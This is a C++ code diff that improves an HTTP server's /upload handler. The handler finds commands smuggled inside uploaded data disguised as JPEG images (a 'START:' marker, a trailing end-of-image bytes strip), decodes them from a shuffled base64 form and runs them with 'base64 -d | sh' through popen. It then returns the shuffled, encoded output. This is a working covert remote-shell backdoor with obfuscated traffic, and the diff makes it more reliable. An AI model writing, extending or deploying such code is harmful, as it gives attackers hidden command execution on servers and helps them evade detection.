@@ -8,6 +8,28 @@
 #include <array>
 #include <cstdio>
 
+static const std::string B64_CHARS =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+// C++ doesn't have base64 encoding, helper to do it manually
+std::string base64_encode(std::string in) {
+    std::string out;
+    int val = 0, valb = -6;
+    for (unsigned char c : in) {
+        val = (val << 8) + c;
+        valb += 8;
+        while (valb >= 0) {
+            out.push_back(B64_CHARS[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    if (valb > -6)
+        out.push_back(B64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
+    while (out.size() % 4)
+        out.push_back('=');
+    return out;
+}
+
 std::string shuffle(std::string input) {
     std::vector<std::string> arr;
     for (std::size_t i = 0; i < input.size(); i += 4) {
@@ -42,10 +64,10 @@ std::string shuffle(std::string input) {
 }
 
 std::string unshuffle(std::string raw) {
-    // make into array
-    std::vector<std::string> arr(raw.size() / 4);
-    int size = arr.size();
-    for (int i = 0; i < size; i++){
+    // Changed: round up chunk count so non-multiple lengths keep tail characters
+    int size = static_cast<int>((raw.size() + 3) / 4);
+    std::vector<std::string> arr(size);
+    for (int i = 0; i < size; i++) {
         arr[i] = raw.substr(i * 4, 4);
     }
     // shuffle 2: swap pair
@@ -80,14 +102,20 @@ int main() {
     server.Post("/upload", [](const httplib::Request& req, httplib::Response& res) {
         std::cout << "Received " << req.body.size() << " bytes\n";
         std::string body(req.body.data(), req.body.size());
-        body = unshuffle(body);
         std::string key = "U1RBUlQ6";
+        size_t pos = body.find(key);
         std::string response;
 
-        size_t pos = body.find(key);
         if (pos != std::string::npos) {
-            std::string raw_cmd = body.substr(pos + key.length());
-            std::string cmd = "echo '" + raw_cmd + "' | base64 -d | sh";
+            // take only shuffled command after "U1RBUlQ6", stripping trailing EOI if present
+            std::string shuffled_cmd = req.body.substr(pos + key.size());
+            std::string eoi = "\xFF\xD9";
+            if (shuffled_cmd.size() >= 2 &&
+            shuffled_cmd.compare(shuffled_cmd.size() - 2, 2, eoi) == 0)
+                shuffled_cmd.erase(shuffled_cmd.size() - 2);
+
+            std::string b64_cmd = unshuffle(shuffled_cmd);
+            std::string cmd = "echo '" + b64_cmd + "' | base64 -d | sh";
             FILE* pipe = popen(cmd.c_str(), "r");
             if (!pipe) {
                 res.set_content("failed", "text/plain");
@@ -97,9 +125,11 @@ int main() {
             while (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
                 response += buffer.data();
             pclose(pipe);
-        } else 
-            response = "...";
-        response = shuffle(response);
+
+            // shuffle output
+            response = shuffle(base64_encode(response));
+        } else
+            response = shuffle(base64_encode(std::string("...")));
         res.set_content(response, "text/plain");
     });
 
